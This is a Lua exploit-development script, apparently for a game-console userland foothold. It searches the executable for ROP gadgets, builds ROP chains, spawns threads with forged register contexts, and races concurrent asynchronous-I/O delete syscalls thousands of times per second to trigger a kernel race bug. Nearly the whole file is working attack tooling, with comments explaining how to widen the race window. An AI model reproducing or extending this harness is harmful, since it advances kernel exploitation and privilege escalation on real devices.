-- CRASH_CLASS: HIGH
-- PROBE 872a: spin-loop aio delete harness
--
-- Every earlier race paid ~1 s per round to spawn threads, so the two deletes
-- never coincided often enough to sample the [T+2] boundary or the unlock
-- window.  This harness keeps two children spinning on a delete loop and lets
-- the PARENT publish a fresh id into the loop's immediate each round, so the
-- two children are already executing when the id appears.  Attempts go from
-- ~1/s to thousands/s.
--
-- Child loop (gadgets from eboot, loop closed with jmp rax):
--   pop rdi <id-slot> ; pop rsi 1 ; pop rdx <stat-slot> ; pop rax 662
--   call fn ; pop rax <loop> ; jmp rax
-- The parent rewrites the id slot word, so the same loop deletes whatever id
-- is current.  Signals: a death (the interesting one), a status other than 0 /
-- 0x80020003 / 0x80020010, or a block whose leftovers cannot be polled.
print("=== PROBE 872a: spin-loop aio delete harness ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local READ, WRITE, SOCKETPAIR = 3, 4, 135
local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
local info = memory.alloc(0x200); wd(info,0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase=(rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local off=0
    while off<limit do
        local want=limit-off; if want>0x1000 then want=0x1000 end
        local ok,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not ok or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true)
        if i then return base+off+i-1 end
        off=off+want
    end
end
local pop_rax=find_pat(ebase,0x494000,string.char(0x58,0xC3))
local pop_rdi=find_pat(ebase,0x494000,string.char(0x5F,0xC3))
local pop_rsi=find_pat(ebase,0x494000,string.char(0x5E,0xC3))
local pop_rdx=find_pat(ebase,0x494000,string.char(0x5A,0xC3))
local jmp_rax=find_pat(ebase,0x494000,string.char(0xFF,0xE0))
local pop_rsp=find_pat(ebase,0x494000,string.char(0x5C,0xC3))
local jmp_g  =find_pat(ebase,0x494000,string.char(0xEB,0xFE))
print(string.format("[A] eboot=%X pop_rax=%s pop_rdi=%s pop_rsp=%s",
    ebase, tostring(pop_rax), tostring(pop_rdi), tostring(pop_rsp)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and pop_rsp) then print("[A] no loop gadget; stopping") return end
local sc_mmap=mk(477)
local page=0x4000; local STACK=page*4
local function mmap(px) local _,a=pcall(function() return sc_mmap(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end); local v=to_num(a); if v~=0 then zero(v,px) end; return v end
local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local ts=memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8,ms*1000000); pcall(function() mk(240)(uint64(ts),uint64(0)) end) end
local sc669,sc662,sc664 = mk(669),mk(662),mk(664)
-- chain layout: 0 pop_rdi, 1 id, 2 pop_rsi, 3 1, 4 pop_rdx, 5 stat, 6 pop_rax, 7 662, 8 fn,
--               9 pop_rax, 10 loop, 11 jmp_rax
local KIDS=2
local kids={}
local SYSFOR={662,664}
for k=1,KIDS do
    local f=memory.alloc(8); wd(f,0xFFFFFFFF); wd(f+4,0xFFFFFFFF)
    local okp=pcall(function() return mk(SOCKETPAIR)(uint64(1),uint64(1),uint64(0),uint64(f)) end)
    local a,b = rd(f) or -1, rd(f+4) or -1
    local block=mmap(STACK)
    local start=block+STACK-0x200
    local idp=mmap(page); local stp=mmap(page)
    local ch={pop_rdi,idp,pop_rsi,1,pop_rdx,stp,pop_rax,SYSFOR[k],fn,pop_rsp,start,pop_rax}
    for i=1,#ch do wq(start+(i-1)*8, uint64(ch[i]==nil and 0 or ch[i])) end
    local bufp=mmap(page)
    local ctx=memory.alloc(0x500); zero(ctx,0x500)
    wq(ctx+Ctx.MAGIC,uint64(0x480)); wq(ctx+Ctx.TYPE,uint64(0x10000))
    wq(ctx+Ctx.CS,uint64(0x43)); wq(ctx+Ctx.SS,uint64(0x3B))
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(start))
    wq(ctx+Ctx.RDI,uint64(a)); wq(ctx+Ctx.RSI,uint64(bufp)); wq(ctx+Ctx.RDX,uint64(1)); wq(ctx+Ctx.RAX,uint64(READ))
    local tb=memory.alloc(8); wq(tb,uint64(0))
    local oks,rvs=pcall(function() return mk(430)(uint64(ctx),uint64(tb),uint64(0)) end)
    kids[k]={peer=b, idp=idp, stp=stp, ok=(oks and to_num(rvs)==0), tid=rd(tb) or 0
             , row=string.format("pop rdi %d | id@%X | stat@%X", idp, idp, stp)}
    print(string.format("[B%d] spawn ok=%s tid=%08X sys=%d idp=%X stp=%X", k, tostring(kids[k].ok), kids[k].tid, SYSFOR[k], idp, stp))
    -- park in read(2)
    sleep_ms(5)
end
-- release both and let them spin
for k=1,KIDS do
    if kids[k].ok then
        local bufp=mmap(page)
        pcall(function() mk(WRITE)(uint64(kids[k].peer),uint64(bufp),uint64(1),uint64(0),uint64(0)) end)
    end
end
sleep_ms(20)
print("[C] spinners released")
local ROUNDS=4000
local both0,mixed,gate,other,bad=0,0,0,0,0
local hist={}
local D=mmap(page); local bufA=mmap(page); local left=mmap(page); local out=mmap(page); local stat=mmap(page); local ids=mmap(page)
for round=1,ROUNDS do
    local f=memory.alloc(8); wd(f,0xFFFFFFFF); wd(f+4,0xFFFFFFFF)
    pcall(function() return mk(SOCKETPAIR)(uint64(1),uint64(1),uint64(0),uint64(f)) end)
    local a,b = rd(f) or -1, rd(f+4) or -1
    zero(D,0x100)
    for i=0,1 do
        local at=D+i*0x28
        wq(at+0x00,uint64(0)); wq(at+0x08,uint64(0x80)); wq(at+0x10,uint64(bufA)); wq(at+0x18,uint64(left)); wd(at+0x20,a); wd(at+0x24,0)
    end
    pcall(function() mk(WRITE)(uint64(b),uint64(bufA),uint64(0x100),uint64(0),uint64(0)) end)
    local COUNT=1
    local base=0
    do local okc,rv=pcall(function() return sc669(uint64(0x1001),uint64(D),uint64(1),uint64(1),uint64(out)) end); base=rd(out) or 0 end
    wd(ids, base)
    pcall(function() sc664(uint64(ids),uint64(1),uint64(stat)) end)
    local s0,s1=rd(stat) or 0, 0
    if s0~=3 then bad=bad+1; if bad<4 then print(string.format("[D%d] poll=%X base=%08X", round, s0, base)) end end
    -- publish ids to the spinners (sentinel first so a stale 0 cannot be read as success)
    wd(kids[1].stp, 0xEEEEEEEE); wd(kids[2].stp, 0xEEEEEEEE)
    wd(kids[1].idp, base)
    wd(kids[2].idp, base)
    sleep_ms(3)
    local v1, v2 = rd(kids[1].stp) or 0, rd(kids[2].stp) or 0
    local key = string.format("%08X/%08X", v1, v2)
    hist[key] = (hist[key] or 0) + 1
    if v1==0 and v2==0 then both0=both0+1
    elseif (v1==0) ~= (v2==0) then mixed=mixed+1; print(string.format("[E%d] mixed status1=%08X status2=%08X", round, v1, v2))
    elseif v1==0x80020010 or v2==0x80020010 then gate=gate+1
    else other=other+1; if other<6 then print(string.format("[F%d] other status1=%08X status2=%08X", round, v1, v2)) end end
    pcall(function() sc664(uint64(ids),uint64(1),uint64(stat)) end)
    local l0,l1=rd(stat) or 0, 0
    if l0~=0x80020003 or l1~=0x80020003 then
        if round%20==0 then print(string.format("[G%d] leftovers=%08X/%08X", round, l0, l1)) end
    end
    wd(kids[1].idp, 0); wd(kids[2].idp, 0)
    if round%250==0 then print(string.format("[H] round %d both0=%d mixed=%d gate=%d other=%d bad=%d", round, both0, mixed, gate, other, bad)) end
end
local keys={} for k in pairs(hist) do keys[#keys+1]=k end
table.sort(keys, function(a,b) return hist[a]>hist[b] end)
for i=1,math.min(12,#keys) do print(string.format("[P] %s x%d", keys[i], hist[keys[i]])) end
print(string.format("[Z] rounds=%d both0=%d mixed=%d gate=%d other=%d bad=%d alive=%s",
    ROUNDS, both0, mixed, gate, other, bad, tostring(to_num(native.fcall_with_rax(fn_ud, 20)))))
